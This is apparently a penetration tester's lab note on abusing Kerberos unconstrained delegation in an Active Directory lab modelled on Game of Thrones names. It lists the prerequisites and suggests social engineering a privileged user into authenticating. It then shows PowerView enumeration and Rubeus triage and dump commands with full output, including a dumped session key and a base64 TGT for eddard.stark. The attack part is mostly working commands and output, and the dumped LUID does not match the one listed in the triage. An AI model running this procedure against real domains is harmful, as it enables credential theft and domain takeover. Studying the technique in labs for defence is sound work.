# Computers


### Prerequisites

1. having unconstrained delegation for a computer:
![[Pasted image 20250901043111.png]]
and can be enumerated with `PoweView.ps1`  : 
```powershell
PS C:\users\robb.stark\Desktop> Get-DomainComputer -Unconstrained | select name

name
----
WINTERFELL
CASTELBLACK
```

> *NOTE: DC Always have unconstrained delegation*

2. Local admin on `CASTLEBLACK` so we can dump TGTs that gets cached because of the `TRUSTED_FOR_DELEGATION` flag

---
### Exploitation

1. Social engineering to convince a high privilege user to authenticate via smb or rdp or any service  to `CASTELBLACK` for it's TGT to get cached

now we can use Rubeus to see the forward-able TGTs
```powershell
PS C:\Users\admin\Desktop> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x2bfbf5

 ---------------------------------------------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                                 | Service                                                             | EndTime             |
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 | 0x3ac732 | eddard.stark @ NORTH.SEVENKINGDOMS.LOCAL | krbtgt/NORTH.SEVENKINGDOMS.LOCAL                                    | 9/1/2025 4:08:53 AM |
 | 0x3e4    | castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL | krbtgt/NORTH.SEVENKINGDOMS.LOCAL                                    | 9/1/2025 3:25:28 AM |
 | 0x3e4    | castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL | cifs/winterfell.north.sevenkingdoms.local                           | 9/1/2025 3:25:28 AM |
 | 0x3e4    | castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL | ldap/winterfell.north.sevenkingdoms.local/north.sevenkingdoms.local | 9/1/2025 3:25:28 AM |
 | 0x17811  | sql_svc @ NORTH.SEVENKINGDOMS.LOCAL      | krbtgt/NORTH.SEVENKINGDOMS.LOCAL                                    | 9/1/2025 3:25:39 AM |
 | 0x17811  | sql_svc @ NORTH.SEVENKINGDOMS.LOCAL      | LDAP/winterfell.north.sevenkingdoms.local/north.sevenkingdoms.local | 9/1/2025 3:25:39 AM |
 | 0x3e7    | castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL | krbtgt/NORTH.SEVENKINGDOMS.LOCAL                                    | 9/1/2025 3:25:31 AM |
 | 0x3e7    | castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL | LDAP/winterfell.north.sevenkingdoms.local                           | 9/1/2025 3:25:31 AM |
 | 0x3e7    | castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL | cifs/winterfell.north.sevenkingdoms.local/north.sevenkingdoms.local | 9/1/2025 3:25:31 AM |
 | 0x3e7    | castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL | CASTELBLACK$                                                        | 9/1/2025 3:25:31 AM |
 | 0x3e7    | castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL | LDAP/winterfell.north.sevenkingdoms.local/north.sevenkingdoms.local | 9/1/2025 3:25:31 AM |
 ---------------------------------------------------------------------------------------------------------------------------------------------------
```
So here is `eddard.stark` TGT 

Next we can use `dump /luid:<LUID> /nowrap` 
```powershell
PS C:\Users\admin\Desktop> .\Rubeus.exe dump /luid:0x3bb537 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


Action: Dump Kerberos Ticket Data (All Users)

[*] Target LUID     : 0x3bb537
[*] Current LUID    : 0x2bfbf5

  UserName                 : eddard.stark
  Domain                   : NORTH
  LogonId                  : 0x3bb537
  UserSID                  : S-1-5-21-3276181164-781382281-1178861266-1111
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/31/2025 6:54:24 PM
  LogonServer              :
  LogonServerDNSDomain     : NORTH.SEVENKINGDOMS.LOCAL
  UserPrincipalName        :


    ServiceName           :  krbtgt/NORTH.SEVENKINGDOMS.LOCAL
    ServiceRealm          :  NORTH.SEVENKINGDOMS.LOCAL
    UserName              :  eddard.stark
    UserRealm             :  NORTH.SEVENKINGDOMS.LOCAL
    StartTime             :  8/31/2025 6:08:53 PM
    EndTime               :  9/1/2025 4:08:53 AM
    RenewTill             :  9/7/2025 6:08:53 PM
    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  Xg0oC/RuSq7GE5e+4tstSmqJK6wxeQTAzOAxZ3X9ONI=
    Base64EncodedTicket   :

      doIFzTCCBcmgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRsbGU5PUlRILlNFVkVOS0lOR0RPTVMuTE9DQUyiLjAsoAMCAQKhJTAjGwZrcmJ0Z3QbGU5PUlRILlNFVkVOS0lOR0RPTVMuTE9DQUyjggRAMIIEPKADAgESoQMCAQKiggQuBIIEKooNG6IREy/WQfChv0r1KQR97bbp16qTJt8uLj794DD6M3Xalt6WY5xKprAqjJBUbhqb7rfYZnfEJcZGujjChAJXoENeLLL34yd5+yRN9D61Q1BFEiZMiCqtva2d7dYG+1TcsAeMS6jMqKC46HLS99176MeEssqTAAoU4/xRpcDI7NsThDq1A+Gx7FuWWR5OLzeEQ/iVuJ/bgViIdyHWGCsRs37SF4KozHTWE8mrfeaSGWOiyuetJ0ybpHPJqn3+AQW9kVQl9AHETntTRvYgr789W+Y9ZPExfYgdF2VU2/rMaUsdxGxhxKK6+Wn9luL9rMfCyf0FJu09kDO+IUaPeS1BfHdF2EYjcOIhFI+bgWWnOWLHuppqXKv9anYjduzBY1AkwvGKWjqGpqXytCoQCHg5I93EG6Q+X7K4/CTzSlukRaRZWc4dsMmyVNDHJfHB9sTHF/NFkN58joL5jz8J8YLePTGhSCG2MLSlmURJwTGW+w4UjHCg0j+zsTLvBTQNbqO8UG8LEP+44lEuVVJ5bQlBldaiwo3DyNeINqOd3oeL4oC6+ZQevdD4CzCQ2GIcBqEpBWQjNrcrCEp+jhisM1IY6pGhqxU7rgG79aZ3GRIIa9vsEe0IECpUStKdXwOA53Czkx2ddArQ1MI/pZhNwkxK68JYL4wTvHihxBrOihxgrr0S2LVZYEKxiaZcHML5aXxFFGiitgdM7NmmRUxi/5/c9g7rlEu3gHDQLPOgpbGbryp/ST82axToG5+k2I4N2f7Z+VIk2WkHTpL4F786RL4A+7Guwn8gMHmS5SygVepNX4sIhzdXkhuBWoL58zodVeLoKSyI28WsSoL+uFMaru8w6qxRTrZVeRQfYCjjYKTmQSZsERqOYl+6ECPy823i1JhHk0G6vsWIGcqvM04ElPAz+9Uxy20PJ1df39UZNi9mHUfyfD3sXBXxp44Ub/vQ0M2RocqxumjdW313fqNXkEDR3cpl1ElPwH2AGQS0ZBORXENX/TZfqMF3p8niMDhopLz/9Rj7HYl6RvReZ7C6DQxdVw/EtqO9Za1YUDGBEKOmKBa38P/ExvJNoLwrCHYvGd1NAk9LalVcSAf8wP4vbN+raa8UTX3edsEMdajFvGI1T6wWjFuCX/vsiwVPAqF/0M1qGD6Csqci9qBNXJTPfJOC3RZIk18VX+ZHMc/44zqSnHgyPPzD3N00McDYsOi6YGQCi7xf1eAhZ7G0etHZofk8lyj9HrKLW5mHi02fPwIp09HOczJyZhxG7wvU+YrKjPt99cBS2SikaF5xx/buR0N4VtcunPWTa/nL7nmyxiaaCZorbvprBcIpJ5KBJg9O7jvIfpNMnKoRaqOHXuwv8loB9fxmAHnIXKOLDTkb4mg0B5okntF05+8qkWxQXvfL1RvMSB6rgSBNS/6jggEVMIIBEaADAgEAooIBCASCAQR9ggEAMIH9oIH6MIH3MIH0oCswKaADAgESoSIEIF4NKAv0bkquxhOXvuLbLUpqiSusMXkEwMzgMWd1/TjSoRsbGU5PUlRILlNFVkVOS0lOR0RPTVMuTE9DQUyiGTAXoAMCAQGhEDAOGwxlZGRhcmQuc3RhcmujBwMFAGChAAClERgPMjAyNTA5MDEwMTA4NTNaphEYDzIwMjUwOTAxMTEwODUzWqcRGA8yMDI1MDkwODAxMDg1M1qoGxsZTk9SVEguU0VWRU5LSU5HRE9NUy5MT0NBTKkuMCygAwIBAqElMCMbBmtyYnRndBsZTk9SVEguU0VWRU5LSU5HRE9NUy5MT0NBTA==
```
> *Notice that there is a flag called forwardable*
